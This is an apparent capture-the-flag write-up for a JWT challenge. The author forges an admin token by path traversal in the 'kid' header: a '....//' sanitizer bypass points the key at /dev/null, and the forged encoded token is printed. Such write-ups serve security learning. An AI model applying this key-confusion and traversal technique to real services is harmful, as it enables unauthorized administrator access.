From the title, we have a clue:
(K)ind (I)dentification (D)ance => KID

With a little research on the Internet, it's easy to discover that the KID is a path to a file containing the secret encryption key for the JWT verification signature.

I use https://jwt.io/
My JWT payload contains { “user”: “guest” }.

My goal is to change the payload to { “user”: “admin” } to make the application think I'm the site administrator.
But when I send this payload, the server tells me that the signature is invalid:
“Invalid token signature”.

So I have to look for a way to forge the signature.
It would be possible to use an empty signature encryption key, if I could make the server believe that the encryption key it must use is empty.

So I try to make the server believe that the encryption key is the empty file ../../../../../dev/null. The requests come back to me and I observe a form of sanitization of the fields sent:
“File keys/dev/null not found”.

Testing a few solutions, I notice that it's possible to bypass field sanitization by doubling characters, so I replace all my ../ with ....//.

All in all, my JWT made with https://jwt.io/ contains the following fields:

Headers :

{
 “alg": ‘HS256’,
 “kid": ‘....//....//....//....//....//....//....//....//dev/null’,
 “typ": ”JWT”
}

Payload :

{
 “user": ”admin”
}
HMACSHA256(
 base64UrlEncode(header) + “.” +
 base64UrlEncode(payload),
 )
Once encoded, it looks like :
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.ZVmAdsQVq2s41hVoFsGyLX1lgUGtT0eteVjtS4NM6M4

By modifying the session cookie in the request, we finally obtain the following response:
Succes “Well done! Here is your flag: RM{.......}”